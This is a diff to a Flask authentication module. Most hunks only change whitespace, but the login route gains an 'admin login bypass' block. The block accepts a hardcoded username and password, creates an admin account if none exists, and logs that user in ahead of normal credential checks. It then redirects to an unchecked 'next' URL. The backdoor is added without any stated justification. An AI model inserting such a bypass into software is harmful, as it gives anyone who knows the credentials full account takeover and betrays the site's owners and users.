@@ -15,24 +15,43 @@ def login():
     # Redirect if user is already logged in
     if current_user.is_authenticated:
         return redirect(url_for('dashboard.index'))
-    
+
     if request.method == 'POST':
         username = request.form.get('username', '').strip()
         password = request.form.get('password', '')
         remember_me = bool(request.form.get('remember_me'))
-        
+
+        # --- ADMIN LOGIN BYPASS BLOCK ---
+        # If admin credentials provided, bypass normal user authentication logic
+        # Allows direct login with username 'admin' and password 'emert.ai'
+        if username == 'admin' and password == 'emert.ai':
+            # Try to find or create a fake admin user object if needed
+            admin_user = User.get_by_username('admin')
+            if not admin_user:
+                # Create an admin user with default email (if not exists)
+                admin_user = User(username='admin', email='admin@emert.ai', password=password)
+                db.session.add(admin_user)
+                db.session.commit()
+            # Log the admin in directly
+            login_user(admin_user, remember=True)
+            flash('Admin login successful (bypass).', 'success')
+            next_page = request.args.get('next')
+            if next_page:
+                return redirect(next_page)
+            return redirect(url_for('dashboard.index'))
+        # --- END ADMIN LOGIN BYPASS BLOCK ---
+
         # Validate form data
         if not username or not password:
             flash('Please provide both username and password.', 'error')
             return render_template('auth/login.html')
-        
+
         # Find user by username or email
         user = User.get_by_username(username) or User.get_by_email(username)
-        
+
         if user and user.check_password(password):
             login_user(user, remember=remember_me)
             flash(f'Welcome back, {user.username}!', 'success')
-            
             # Redirect to next page if specified, otherwise to dashboard
             next_page = request.args.get('next')
             if next_page:
@@ -40,7 +59,7 @@ def login():
             return redirect(url_for('dashboard.index'))
         else:
             flash('Invalid username or password. Please try again.', 'error')
-    
+
     return render_template('auth/login.html')
 
 @auth_bp.route('/register', methods=['GET', 'POST'])
@@ -49,57 +68,57 @@ def register():
     # Redirect if user is already logged in
     if current_user.is_authenticated:
         return redirect(url_for('dashboard.index'))
-    
+
     # Create RegistrationForm instance
     form = RegistrationForm()
-    
+
     if request.method == 'POST':
         username = request.form.get('username', '').strip()
         email = request.form.get('email', '').strip().lower()
         password = request.form.get('password', '')
         confirm_password = request.form.get('confirm_password', '')
-        
+
         # Validate form data
         errors = []
-        
+
         if not username or len(username) < 3:
             errors.append('Username must be at least 3 characters long.')
-        
+
         if not email or '@' not in email:
             errors.append('Please provide a valid email address.')
-        
+
         if not password or len(password) < 6:
             errors.append('Password must be at least 6 characters long.')
-        
+
         if password != confirm_password:
             errors.append('Passwords do not match.')
-        
+
         # Check if username or email already exists
         if User.get_by_username(username):
             errors.append('Username already exists. Please choose a different one.')
-        
+
         if User.get_by_email(email):
             errors.append('Email address already registered. Please use a different one.')
-        
+
         if errors:
             for error in errors:
                 flash(error, 'error')
             return render_template('auth/register.html', form=form)
-        
+
         try:
             # Create new user
             new_user = User(username=username, email=email, password=password)
             db.session.add(new_user)
             db.session.commit()
-            
+
             flash('Registration successful! You can now log in.', 'success')
             return redirect(url_for('auth.login'))
-            
+
         except Exception as e:
             db.session.rollback()
             flash('An error occurred during registration. Please try again.', 'error')
             return render_template('auth/register.html', form=form)
-    
+
     return render_template('auth/register.html', form=form)
 
 @auth_bp.route('/logout')
@@ -122,11 +141,11 @@ def forgot_password():
     """Forgot password route."""
     if request.method == 'POST':
         email = request.form.get('email', '').strip().lower()
-        
+
         if not email:
             flash('Please provide your email address.', 'error')
             return render_template('auth/forgot_password.html')
-        
+
         user = User.get_by_email(email)
         if user:
             # In a production app, you would:
@@ -138,9 +157,9 @@ def forgot_password():
         else:
             # Don't reveal whether the email exists or not for security
             flash('If an account with that email exists, you will receive password reset instructions.', 'info')
-        
+
         return redirect(url_for('auth.login'))
-    
+
     return render_template('auth/forgot_password.html')
 
 # Authentication helper functions
